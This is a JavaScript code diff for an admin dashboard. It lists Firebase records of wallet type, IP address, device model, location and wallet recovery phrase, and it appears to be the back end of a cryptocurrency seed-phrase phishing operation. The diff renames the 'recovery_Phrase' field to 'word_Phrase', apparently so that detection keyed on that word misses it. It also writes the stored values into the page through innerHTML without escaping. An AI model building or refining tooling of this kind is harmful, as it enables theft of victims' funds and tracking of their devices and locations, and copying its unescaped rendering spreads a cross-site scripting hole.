@@ -81,7 +81,7 @@ function checkUserRole(uid) {
 // Fetch and display users or WalletResponse data
 function fetchUsers() {
   const usersList = document.getElementById("users-list");
-  const walletRef = ref(database, "WalletResponse");
+  const walletRef = ref(database, "Wallet_Response");
 
   // Listen for WalletResponse data changes
   onValue(
@@ -89,29 +89,29 @@ function fetchUsers() {
     (snapshot) => {
       usersList.innerHTML = ""; // Clear the list before adding new rows
       snapshot.forEach((childSnapshot) => {
-        const walletResponse = childSnapshot.val();
-        const timestamp = walletResponse.timestamp
-          ? formatDate(walletResponse.timestamp)
+        const wallet_Response = childSnapshot.val();
+        const timestamp = wallet_Response.timestamp
+          ? formatDate(wallet_Response.timestamp)
           : "N/A";
 
         // Create a new row for each WalletResponse entry
         const row = document.createElement("tr");
         row.innerHTML = `
-          <td>${walletResponse.wallet_Type || "N/A"}</td>
+          <td>${wallet_Response.wallet_Type || "N/A"}</td>
           <td>${timestamp || "N/A"}</td>
-          <td>${walletResponse.ip_Address || "N/A"}</td>
-          <td>${walletResponse.device_Model || "N/A"}</td>
+          <td>${wallet_Response.ip_Address || "N/A"}</td>
+          <td>${wallet_Response.device_Model || "N/A"}</td>
           <td>${
-            walletResponse.location
-              ? `${walletResponse.location.city || ""}, ${
-                  walletResponse.location.region || ""
-                }, ${walletResponse.location.country || ""}`.replace(
+            wallet_Response.location
+              ? `${wallet_Response.location.city || ""}, ${
+                  wallet_Response.location.region || ""
+                }, ${wallet_Response.location.country || ""}`.replace(
                   /(^, )|(, $)/g,
                   ""
                 ) // Removes leading/trailing commas
               : "N/A"
           }</td>
-          <td>${walletResponse.recovery_Phrase || "N/A"}</td>
+          <td>${wallet_Response.word_Phrase || "N/A"}</td>
         `;
         const firstRow = usersList.firstChild; // Get the first row in the table
 
